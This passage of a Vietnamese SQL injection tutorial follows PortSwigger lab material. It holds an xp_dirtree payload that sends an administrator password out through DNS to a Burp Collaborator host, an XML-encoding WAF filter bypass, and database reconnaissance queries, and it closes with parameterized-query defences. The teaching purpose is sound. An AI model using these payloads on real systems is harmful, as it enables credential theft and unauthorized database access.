0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```
Trên giao diện Burp Collaborator, bạn sẽ nhận được thông báo xác nhận truy vấn DNS này đã được kích hoạt thành công.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band) *(Chưa được giải quyết)*

##### 2. Trích xuất dữ liệu trực tiếp qua kênh DNS (Out-of-band Data Exfiltration):
Sau khi đã xác nhận kích hoạt được tương tác ngoài luồng, bạn có thể đọc dữ liệu nhạy cảm và **gắn trực tiếp vào tên miền con (subdomain)** trước khi gửi request DNS:
```sql
'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='Administrator'); exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
Khi câu lệnh này thực thi, server sẽ truy vấn DNS cho tên miền có chứa mật khẩu:
```text
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```
Mật khẩu `S3cure` được gửi thẳng về log của Burp Collaborator mà không cần phải dò từng ký tự một!

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration) *(Chưa được giải quyết)*

---

### Dạng 5: SQL Injection bậc hai (Second-order SQL injection / Stored SQLi)

* **First-order SQL injection (Bậc một):** Xảy ra khi ứng dụng xử lý dữ liệu đầu vào của người dùng từ HTTP request và đưa input đó vào câu truy vấn SQL theo cách không an toàn (thực thi ngay lập tức trong cùng chu kỳ xử lý request đó).
* **Second-order SQL injection (Bậc hai / Stored SQLi):** Xảy ra khi ứng dụng nhận input của người dùng từ HTTP request và **lưu trữ nó để sử dụng trong tương lai** (thường là lưu vào database). Tại thời điểm lưu trữ dữ liệu, không có lỗ hổng nào phát sinh. Sau đó, khi xử lý một HTTP request khác, ứng dụng đọc lại dữ liệu đã lưu trữ từ database và đưa nó vào một câu truy vấn SQL theo cách không an toàn. Vì lý do này, Second-order SQLi còn được gọi là **Stored SQL injection**.

Second-order SQL injection thường xảy ra trong các trường hợp nhà phát triển đã có nhận thức về lỗ hổng SQL injection, nên đã xử lý an toàn input ở bước lưu trữ ban đầu vào database. Tuy nhiên, khi dữ liệu được xử lý ở bước sau, họ lại lầm tưởng rằng dữ liệu đó là "an toàn" vì nó đã nằm sẵn trong database. Tại thời điểm này, dữ liệu bị đem đi xử lý không an toàn (nối chuỗi) vì lập trình viên tin tưởng sai lầm rằng dữ liệu từ database là dữ liệu đáng tin cậy.

---

## 5. Kiểm tra cơ sở dữ liệu (Examining the database)

Một số tính năng cốt lõi của ngôn ngữ SQL được triển khai giống nhau trên các hệ quản trị cơ sở dữ liệu phổ biến, do đó nhiều cách phát hiện và khai thác lỗ hổng SQL injection hoạt động tương tự nhau trên các loại database khác nhau.

Tuy nhiên, cũng có rất nhiều điểm khác biệt giữa các hệ quản trị cơ sở dữ liệu phổ biến. Điều này có nghĩa là một số kỹ thuật phát hiện và khai thác SQL injection sẽ hoạt động khác nhau trên từng nền tảng cụ thể. Ví dụ:
* Cú pháp nối chuỗi (Syntax for string concatenation).
* Cú pháp chú thích (Comments: `--`, `#`, `/* ... */`).
* Truy vấn hàng loạt hoặc xếp chồng (Batched / Stacked queries).
* Các API đặc thù của từng nền tảng (Platform-specific APIs).
* Các thông báo lỗi (Error messages).

#### Đọc thêm:
* [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Thu thập thông tin về cơ sở dữ liệu (Database Reconnaissance)
Sau khi xác định được lỗ hổng SQL injection, việc thu thập thông tin về database là vô cùng hữu ích để giúp bạn tiến hành khai thác lỗ hổng:

#### 1. Truy vấn phiên bản Database (Version details)
Bạn có thể truy vấn thông tin phiên bản của database. Các phương thức khác nhau sẽ hoạt động trên các loại database khác nhau. Điều này có nghĩa là nếu bạn tìm thấy một phương thức cụ thể hoạt động, bạn có thể suy ra loại database mục tiêu. Ví dụ, trên **Oracle**, bạn có thể thực thi:
```sql
SELECT * FROM v$version
```

#### 2. Liệt kê các bảng và cột hiện có (Tables & Columns)
Bạn cũng có thể xác định những bảng nào tồn tại trong database và các cột mà chúng chứa. Ví dụ, trên hầu hết các hệ quản trị database hiện đại (như MySQL, PostgreSQL, SQL Server), bạn có thể thực thi truy vấn sau để liệt kê danh sách các bảng:
```sql
SELECT * FROM information_schema.tables
```

#### Đọc thêm:
* [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)
* [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 6. SQL injection trong các ngữ cảnh khác nhau (SQL injection in different contexts)

Trong các bài lab trước, điểm chèn tải trọng (payload) độc hại thường nằm ở query string trên URL. Tuy nhiên, bạn có thể thực hiện tấn công SQL injection bằng bất kỳ input nào mà ứng dụng tiếp nhận và đưa vào xử lý trong câu truy vấn SQL. Ví dụ, một số trang web nhận dữ liệu đầu vào ở định dạng **JSON** hoặc **XML** và sử dụng dữ liệu này để truy vấn cơ sở dữ liệu.

Các định dạng dữ liệu khác nhau này có thể cung cấp những cách khác nhau để bạn **xáo trộn/ẩn giấu tấn công (Obfuscate attacks)** nhằm vượt qua các hệ thống tường lửa ứng dụng web (WAF) và các cơ chế phòng thủ khác. Những hệ thống phòng thủ yếu thường chỉ tìm kiếm các từ khóa SQL injection phổ biến trong request, do đó bạn có thể vượt qua các bộ lọc này bằng cách mã hóa (encode) hoặc escape các ký tự trong các từ khóa bị cấm. 

Ví dụ, câu tấn công SQL injection dựa trên XML dưới đây sử dụng chuỗi escape XML `&#x53;` để mã hóa ký tự `S` trong từ khóa `SELECT`:
```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
Đoạn mã này sẽ được giải mã (decoded) ở phía server trước khi được chuyển tiếp đến trình thông dịch SQL (SQL interpreter).

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding) *(Chưa được giải quyết)*

---

## 7. Cách phòng chống SQL injection (How to prevent SQL injection)

Bạn có thể phòng chống hầu hết các trường hợp SQL injection bằng cách sử dụng **Truy vấn tham số hóa (Parameterized Queries)** thay vì nối chuỗi trực tiếp vào câu truy vấn. Các parameterized queries này còn được gọi là **Prepared Statements**.

### So sánh mã nguồn:

#### ❌ Mã nguồn dễ bị tấn công (Vulnerable Code):
Đoạn mã Java sau rất dễ bị SQL injection vì dữ liệu đầu vào của người dùng bị nối trực tiếp vào câu truy vấn:
```java
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

#### ✅ Mã nguồn an toàn (Secure Code):
Bạn có thể viết lại đoạn mã trên theo cách ngăn chặn hoàn toàn input của người dùng can thiệp vào cấu trúc của câu lệnh SQL:
```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

### Phạm vi áp dụng & Hạn chế của Parameterized Queries:
* **Trường hợp áp dụng tốt:** Bạn có thể sử dụng parameterized queries cho bất kỳ vị trí nào mà input không đáng tin cậy đóng vai trò là **dữ liệu (Data / Literals)** bên trong câu truy vấn, bao gồm mệnh đề `WHERE` và các giá trị trong câu lệnh `INSERT` hoặc `UPDATE`.
* **Trường hợp KHÔNG THỂ áp dụng:** Parameterized queries **không thể** được dùng để xử lý input ở các thành phần cú pháp khác của câu lệnh, chẳng hạn như:
  * Tên bảng (Table names).
  * Tên cột (Column names).
  * Mệnh đề thứ tự sắp xếp (`ORDER BY ASC/DESC`).

Đối với các chức năng của ứng dụng bắt buộc phải đưa dữ liệu người dùng vào các thành phần cú pháp này, ứng dụng cần áp dụng các phương pháp tiếp cận khác:
1. **White-listing (Danh sách trắng):** Chỉ cho phép các giá trị nằm trong danh sách an toàn đã được định nghĩa cứng từ trước.
2. **Sử dụng logic thay thế:** Thiết kế luồng xử lý riêng để đáp ứng hành vi mà không cần truyền trực tiếp tên cột/bảng từ input.

### Quy tắc an toàn bắt buộc:
Để một câu truy vấn parameterized query thực sự hiệu quả trong việc ngăn chặn SQL injection:
* Chuỗi truy vấn được đưa vào hàm prepare **luôn luôn phải là một chuỗi hằng số cố định (Hard-coded Constant)**. Nó không bao giờ được phép chứa bất kỳ dữ liệu biến đổi (variable data) nào từ bất kỳ nguồn gốc nào.
* **Tuyệt đối không quyết định theo kiểu tình huống (case-by-case)** xem một phần dữ liệu có an toàn hay không để rồi tiếp tục dùng kỹ thuật nối chuỗi cho các trường hợp được coi là "an toàn". Rất dễ mắc sai lầm về nguồn gốc thực sự của dữ liệu, hoặc các thay đổi mã nguồn ở nơi khác có thể làm biến chất (taint) dữ liệu vốn được coi là tin cậy.

#### Đọc thêm:
* [Tìm kiếm lỗ hổng SQL injection bằng Burp Suite Web Vulnerability Scanner](https://portswigger.net/burp/vulnerability-scanner)
